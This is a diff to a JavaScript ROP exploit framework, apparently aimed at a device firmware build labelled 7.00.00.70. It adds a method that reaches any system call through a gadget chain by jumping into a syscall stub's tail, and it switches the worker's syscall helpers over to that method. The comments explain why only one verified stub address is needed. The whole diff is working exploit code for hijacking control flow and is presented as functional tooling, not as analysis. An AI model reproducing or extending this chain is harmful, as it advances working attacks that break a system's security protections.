@@ -211,8 +211,38 @@ class rop {
         this.push(rip);
     }
 
+    /* Invoke a syscall by NUMBER rather than by stub address.
+       -------------------------------------------------------------------
+       Every stub is `mov rax, NR ; mov r10, rcx ; syscall ; jb err ; ret`,
+       identical in all 328 cases but for the immediate. So the tail at
+       stub+7 is a general-purpose syscall instruction: set rax with the
+       `pop rax` gadget and any number becomes reachable through it.
+
+       That matters on 7.00.00.70, where the stub block gained entries and
+       272 of the addresses in syscall_map are interpolated across a step
+       rather than measured. Those addresses are now irrelevant -- only ONE
+       stub has to be right, and getpid's was read straight out of the
+       import GOT and proved by returning a plausible pid.
+
+       rax must be loaded AFTER push_sysv: this build has no `pop r9`, and
+       the stand-in it uses (`xor r9d,r9d ; test r9,r9 ; setne al ; ret`)
+       clobbers al. */
+    fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
+        if (!this.p.syscall_insn) {
+            this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+            return;
+        }
+        this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
+        this.push(this.gadgets["pop rax"]);
+        this.push(sysc);
+        if (this.stack_entry_point.add32(this.count * 0x8).low & 0x8) {
+            this.push(this.gadgets["ret"]);
+        }
+        this.push(this.p.syscall_insn);
+    }
+
     add_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
     }
 
     get_rsp() {
@@ -545,15 +575,21 @@ class worker_rop extends rop {
     }
 
     async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        return await this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
+        this.write_result(this.return_value);
+        await this.run();
+        return this.p.read8(this.return_value);
     }
 
     async syscall_int32(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        return await this.call32(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
+        this.write_result4(this.return_value);
+        await this.run();
+        return this.p.read4(this.return_value) << 0;
     }
 
     add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
         this.write_result(retstore);
     }
 
